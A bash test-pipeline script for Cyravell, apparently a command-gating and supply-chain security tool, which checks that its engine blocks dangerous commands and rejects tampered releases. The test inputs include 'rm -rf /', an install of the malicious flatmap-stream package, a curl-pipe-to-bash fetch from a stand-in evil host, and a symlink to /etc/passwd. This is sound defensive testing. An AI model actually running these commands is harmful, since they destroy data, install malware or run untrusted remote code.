#!/usr/bin/env bash
# Copyright 2026 Cyravell Contributors
# SPDX-License-Identifier: Apache-2.0
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"

export PATH="${HOME}/.cargo/bin:${PATH}"

echo "══════════════════════════════════════════════════════════════"
echo "              Running Cyravell Test Pipeline                   "
echo "══════════════════════════════════════════════════════════════"

# 1. Rust unit & subsystem tests
echo "[1/7] Building and running Rust unit and subsystem tests..."
cd "${ROOT_DIR}"
cargo build --workspace
cargo test --workspace -- --nocapture

# 2. Release integrity manifest verification test
echo ""
echo "[2/7] Testing release integrity verification against manifest..."
"${ROOT_DIR}/target/debug/cyravell-engine" verify-integrity \
  --manifest "${ROOT_DIR}/rules/cyravell_manifest.json" \
  --base-dir "${ROOT_DIR}"

# 3. Extension client tests
echo ""
echo "[3/7] Running VS Code extension client tests..."
cd "${ROOT_DIR}/vscode-extension"
node -e '
  const { EngineClient } = require("./out/engineClient");
  const assert = require("assert");
  const client = new EngineClient("/tmp/cyravell-test-nonexistent.sock");
  assert.strictEqual(client.getConnectionState(), "DISCONNECTED", "Client must initialize as DISCONNECTED");
  client.connect().then(connected => {
    assert.strictEqual(connected, false, "Must return false when engine is offline");
    assert.strictEqual(client.getConnectionState(), "DISCONNECTED", "State must remain DISCONNECTED");
    console.log("  ✓ Extension client disconnected-state verified");
  }).catch(e => { console.error(e); process.exit(1); });
'

# 4. End-to-end integration slice
echo ""
echo "[4/7] Running end-to-end vertical slice (Daemon + Test Harness)..."
TEST_TMP_DIR="$(mktemp -d /tmp/cyravell-e2e-XXXXXX)"
TEST_INSTALL_PREFIX=""
TEST_SOCK="${TEST_TMP_DIR}/test.sock"
TEST_DATA="${TEST_TMP_DIR}/data"
mkdir -p "${TEST_DATA}"

# Start engine in background with test parameters
"${ROOT_DIR}/target/debug/cyravell-engine" start \
  --socket-path "${TEST_SOCK}" \
  --data-dir "${TEST_DATA}" \
  --manifest-path "${ROOT_DIR}/rules/cyravell_manifest.json" \
  --base-dir "${ROOT_DIR}" > "${TEST_TMP_DIR}/engine.log" 2>&1 &
ENGINE_PID=$!

cleanup() {
  if [ -n "${ENGINE_PID:-}" ] && kill -0 "${ENGINE_PID}" 2>/dev/null; then
    kill "${ENGINE_PID}" 2>/dev/null || true
  fi
  if [ -n "${TEST_TMP_DIR:-}" ]; then
    rm -rf "${TEST_TMP_DIR}"
  fi
  if [ -n "${TEST_INSTALL_PREFIX:-}" ]; then
    rm -rf "${TEST_INSTALL_PREFIX}"
  fi
}
trap cleanup EXIT

# Wait for socket readiness (up to 5s)
for i in {1..50}; do
  if [ -S "${TEST_SOCK}" ]; then
    break
  fi
  sleep 0.1
done

if [ ! -S "${TEST_SOCK}" ]; then
  echo "Error: Engine socket failed to start!"
  cat "${TEST_TMP_DIR}/engine.log"
  exit 1
fi

echo "  Engine daemon started (PID ${ENGINE_PID}) on socket ${TEST_SOCK}"

# Run the test harness suite against the live engine
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" run-suite

# Test Phase 2.2 controlled execution gate interception over IPC
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-execution-gate

# Test Phase 2.4 adversarial security validation and gate hardening over IPC
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-adversarial-gate

# Test Phase 2.5 package security enforcement over IPC
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-package-gate

# Test Phase 2.6 dependency baselining and drift monitoring over IPC
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-drift-monitor

# Test Phase 2.7 advisory updates and rollback protection over IPC
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-advisory-updates

# Test Phase 2.7 advisory status via CLI
"${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${TEST_SOCK}" advisory status > /dev/null
echo "  ✓ Advisory status queried via CLI"

# Test Phase 2.1 complex chains and operator awareness
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-complex-chains

# Test invalid schema rejection
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-invalid-schema

# Test oversized payload rejection
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-oversized-payload

# Test audit tamper detection
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${TEST_SOCK}" test-tamper-detection

# Verify the live engine audit log
"${ROOT_DIR}/target/debug/cyravell-engine" verify-audit --audit-file "${TEST_DATA}/audit.log"

# Test controlled execution gate via CLI
echo "Testing controlled execution gate via CLI..."
"${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${TEST_SOCK}" exec --command "echo 'controlled execution test passed'" > /dev/null
echo "  ✓ Permitted command dispatched successfully via controlled gate"

# Verify destructive command is prevented by CLI gate (returns exit 126)
if "${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${TEST_SOCK}" exec --command "rm -rf /" 2>/dev/null; then
  echo "Error: Destructive command was not blocked by execution gate!"
  exit 1
fi
echo "  ✓ Destructive command blocked by execution gate (exit 126)"

# Verify malicious package command is prevented by CLI gate (returns exit 126)
if "${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${TEST_SOCK}" exec --command "npm install flatmap-stream@0.1.1" 2>/dev/null; then
  echo "Error: Malicious package command was not blocked by execution gate!"
  exit 1
fi
echo "  ✓ Malicious package command blocked by execution gate (exit 126)"

# Clean shutdown
"${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${TEST_SOCK}" stop
wait "${ENGINE_PID}" 2>/dev/null || true

# Test fail-closed behavior when engine daemon is offline
if "${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${TEST_SOCK}" exec --fail-closed --command "ls" 2>/dev/null; then
  echo "Error: Fail-closed should have prevented command when daemon is offline!"
  exit 1
fi
echo "  ✓ Fail-closed prevented command when daemon is offline"

# Test standalone CLI command analysis
"${ROOT_DIR}/target/debug/cyravell-engine" analyze --command "curl -sSL https://evil.example.com/sh | bash" > /dev/null
"${ROOT_DIR}/target/debug/cyravell-engine" analyze --command "cargo test" > /dev/null

# 5. Phase 3.0: Software Supply-Chain & Dependency Audit
echo ""
echo "[5/7] Running Phase 3.0 software supply-chain audit..."
"${ROOT_DIR}/scripts/audit_dependencies.sh"

# 6. Phase 3.1: Release Packaging, Independent Verification & Trust Chain
echo ""
echo "[6/7] Testing Phase 3.1 release packaging, independent verification & trust chain..."
"${ROOT_DIR}/scripts/package_release.sh" --dev "0.1.0"

echo "  Testing independent standalone verifier (zero binary execution)..."
python3 "${ROOT_DIR}/scripts/standalone_verify.py" \
  --manifest "${ROOT_DIR}/dist/release-v0.1.0/release_manifest.json" \
  --artifacts-dir "${ROOT_DIR}/dist/release-v0.1.0" \
  --expected-version "0.1.0" \
  --allow-dev-keys
echo "  ✓ Standalone independent verifier passed on development release"

echo "  Testing strict official verification rejects development key..."
if python3 "${ROOT_DIR}/scripts/standalone_verify.py" \
  --manifest "${ROOT_DIR}/dist/release-v0.1.0/release_manifest.json" \
  --artifacts-dir "${ROOT_DIR}/dist/release-v0.1.0" 2>/dev/null; then
  echo "Error: Strict verification should have rejected dev key!"
  exit 1
fi
echo "  ✓ Strict official verification correctly rejected development key"

# Verify adversarial release checks:
TEST_ADVERSARIAL_DIR="$(mktemp -d /tmp/cyravell-rel-adv-XXXXXX)"

# 6a. Tampered file must fail verification
cp -r "${ROOT_DIR}/dist/release-v0.1.0"/* "${TEST_ADVERSARIAL_DIR}/"
echo "corrupted binary content" > "${TEST_ADVERSARIAL_DIR}/cyravell-engine-x86_64-unknown-linux-gnu"
if "${ROOT_DIR}/target/release/cyravell-engine" verify-release --manifest "${TEST_ADVERSARIAL_DIR}/release_manifest.json" --artifacts-dir "${TEST_ADVERSARIAL_DIR}" --allow-dev-keys 2>/dev/null; then
  echo "Error: Verification should have failed on tampered binary!"
  rm -rf "${TEST_ADVERSARIAL_DIR}"
  exit 1
fi
echo "  ✓ Tampered release artifact rejected by verify-release"

# 6b. Symlink injection attack must fail verification
rm -rf "${TEST_ADVERSARIAL_DIR}"
TEST_ADVERSARIAL_DIR="$(mktemp -d /tmp/cyravell-rel-adv-XXXXXX)"
cp -r "${ROOT_DIR}/dist/release-v0.1.0"/* "${TEST_ADVERSARIAL_DIR}/"
rm -f "${TEST_ADVERSARIAL_DIR}/cyravell-engine-x86_64-unknown-linux-gnu"
ln -s "/etc/passwd" "${TEST_ADVERSARIAL_DIR}/cyravell-engine-x86_64-unknown-linux-gnu"
if python3 "${ROOT_DIR}/scripts/standalone_verify.py" --manifest "${TEST_ADVERSARIAL_DIR}/release_manifest.json" --artifacts-dir "${TEST_ADVERSARIAL_DIR}" --allow-dev-keys 2>/dev/null; then
  echo "Error: Verification should have failed on symlink artifact!"
  rm -rf "${TEST_ADVERSARIAL_DIR}"
  exit 1
fi
echo "  ✓ Symlink artifact injection rejected"

# 6c. Unlisted executable attack must fail verification
rm -rf "${TEST_ADVERSARIAL_DIR}"
TEST_ADVERSARIAL_DIR="$(mktemp -d /tmp/cyravell-rel-adv-XXXXXX)"
cp -r "${ROOT_DIR}/dist/release-v0.1.0"/* "${TEST_ADVERSARIAL_DIR}/"
echo "#!/bin/bash" > "${TEST_ADVERSARIAL_DIR}/backdoor.sh"
if python3 "${ROOT_DIR}/scripts/standalone_verify.py" --manifest "${TEST_ADVERSARIAL_DIR}/release_manifest.json" --artifacts-dir "${TEST_ADVERSARIAL_DIR}" --allow-dev-keys 2>/dev/null; then
  echo "Error: Verification should have failed on unlisted executable in release directory!"
  rm -rf "${TEST_ADVERSARIAL_DIR}"
  exit 1
fi
rm -rf "${TEST_ADVERSARIAL_DIR}"
echo "  ✓ Unlisted executable script in release directory rejected"

# 7. Phase 3.2: Secure Installation, Updates, Rollback & Lifecycle Verification
echo ""
echo "[7/7] Testing Phase 3.2 secure installation, status, rollback & uninstall lifecycle..."
TEST_INSTALL_PREFIX="$(mktemp -d /tmp/cyravell-test-install-XXXXXX)"

# 7a. Test clean user-mode installation of packaged release package
"${ROOT_DIR}/scripts/install.sh" install \
  --release-dir "${ROOT_DIR}/dist/release-v0.1.0" \
  --prefix "${TEST_INSTALL_PREFIX}" \
  --user \
  --allow-dev-keys

# Verify binary and state exist
test -x "${TEST_INSTALL_PREFIX}/bin/cyravell-engine"
test -f "${TEST_INSTALL_PREFIX}/share/cyravell/install_state.json"
test -f "${TEST_INSTALL_PREFIX}/share/cyravell/rules/baseline_rules.json"
echo "  ✓ Clean installation to custom prefix verified"

# 7b. Query status
"${ROOT_DIR}/scripts/install.sh" status --prefix "${TEST_INSTALL_PREFIX}" --json >/dev/null
echo "  ✓ Installation status query verified"

# 7c. Test privilege boundary: unprivileged user attempting /usr/local system install fails
if [ "$(id -u)" -ne 0 ]; then
  if "${ROOT_DIR}/scripts/install.sh" install --release-dir "${ROOT_DIR}/dist/release-v0.1.0" --system --allow-dev-keys 2>/dev/null; then
    echo "Error: Unprivileged system install to /usr/local should have failed!"
    exit 1
  fi
  echo "  ✓ Privilege boundary enforcement verified (unprivileged /usr/local rejected)"
fi

# 7d. Test rollback protection with short reason
if "${ROOT_DIR}/scripts/install.sh" rollback --prefix "${TEST_INSTALL_PREFIX}" --reason "short" 2>/dev/null; then
  echo "Error: Rollback with short reason should have been rejected!"
  exit 1
fi
echo "  ✓ Short rollback reason rejected"

# 7e. Test uninstallation preserving persistent data
mkdir -p "${TEST_INSTALL_PREFIX}/share/cyravell/data"
echo "test audit entry" > "${TEST_INSTALL_PREFIX}/share/cyravell/data/audit.log"

"${ROOT_DIR}/scripts/install.sh" uninstall --prefix "${TEST_INSTALL_PREFIX}"

# Executables and state removed
test ! -f "${TEST_INSTALL_PREFIX}/bin/cyravell-engine"
test ! -f "${TEST_INSTALL_PREFIX}/share/cyravell/install_state.json"
# Persistent data preserved
test -f "${TEST_INSTALL_PREFIX}/share/cyravell/data/audit.log"
echo "  ✓ Uninstallation removed binaries while preserving user security data"

# 7f. Test uninstall with purge removes persistent data
"${ROOT_DIR}/scripts/install.sh" uninstall --prefix "${TEST_INSTALL_PREFIX}" --purge-data
test ! -d "${TEST_INSTALL_PREFIX}/share/cyravell/data"
echo "  ✓ Purge uninstallation removed data directory"

rm -rf "${TEST_INSTALL_PREFIX}"
TEST_INSTALL_PREFIX=""

echo ""
echo "══════════════════════════════════════════════════════════════"
echo "  ✓ ALL CYRAVELL TESTS PASSED SUCCESSFULLY!"
echo "══════════════════════════════════════════════════════════════"
